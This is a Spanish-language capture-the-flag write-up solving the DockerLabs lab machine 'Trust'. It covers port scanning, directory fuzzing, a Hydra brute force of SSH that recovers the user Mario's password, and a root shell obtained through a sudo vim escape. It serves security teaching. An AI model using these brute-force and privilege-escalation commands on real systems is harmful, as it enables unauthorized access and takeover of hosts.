
# Trust - Resolviendo la Máquina

## Introducción
Hola, bienvenidos y bienvenidas. Vamos a resolver una máquina de la plataforma DockerLabs llamada **Trust**. A continuación, verás paso a paso cómo se resuelve. ¡Que te diviertas!

---

## Iniciando la Máquina
### Comprobando Conexión
Hacemos un ping a la máquina para comprobar la conexión:

```bash
ping -c 1 172.18.0.2
```

---

## Escaneo de Puertos
Utilizamos `nmap` con la IP proporcionada por DockerLabs para ver los puertos abiertos:

```bash
sudo nmap -p- –open -sS –min-rate 5000 -vvv -n -Pn 172.18.0.2
```

Resultados relevantes:
- Puerto **22** (SSH) abierto.
- Puerto **80** (HTTP) abierto.

---

## Análisis del Sitio Web


![login](https://github.com/xavis3c/Writeups-dockerlabs/blob/Recursos/debian-web.png)




Accedemos al sitio en el navegador y vemos que es la página por defecto de Apache2. No encontramos nada interesante, así que seguimos con más pruebas.

### Fuzzing con Gobuster
Ejecutamos Gobuster para encontrar directorios y archivos ocultos:

```bash
gobuster dir -u "http://172.18.0.2/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,py,bak,php.bak
```

Explicación:
- `dir` → Escaneo de directorios y archivos.
- `-u` → URL objetivo (`http://http://172.18.0.2`).
- `-w` → Lista de palabras con nombres comunes de directorios/archivos.
- `-x` → Prueba archivos con extensiones específicas.

Descubrimos un archivo **/secret.php**. Nos dirigimos a él en el navegador con:

```bash
http://http://172.18.0.2//secret.php
```

Este archivo nos revela que existe un usuario llamado **Mario**.

![login](https://github.com/xavis3c/Writeups-dockerlabs/blob/Recursos/hola-mario.png)




---

## Ataque de Fuerza Bruta con Hydra
Dado que conocemos el usuario **Mario**, realizamos un ataque de fuerza bruta con Hydra sobre el puerto SSH:

```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2 -t 4
```

Explicación:
- `-l mario` → Usuario objetivo.
- `-P /usr/share/wordlists/rockyou.txt` → Lista de contraseñas a probar.
- `ssh` → Servicio objetivo (SSH).
- `-t 4` → Usa 4 hilos para acelerar el ataque.

Hydra nos da la contraseña **chocolate**.

Nos conectamos por SSH con:

```bash
ssh mario@172.18.0.2
```

---

## Escalada de Privilegios
Ya dentro de la máquina como Mario, buscamos formas de escalar privilegios.

Ejecutamos:

```bash
sudo -l
```

Descubrimos que podemos ejecutar **/usr/bin/vim** con privilegios elevados. Buscamos en GTFOBins y encontramos que podemos obtener una shell de root con el siguiente comando:

```bash
sudo vim -c ':!bash'
```

Verificamos con:

```bash
whoami
```

¡Ahora somos **root**!

---

¡Máquina resuelta!

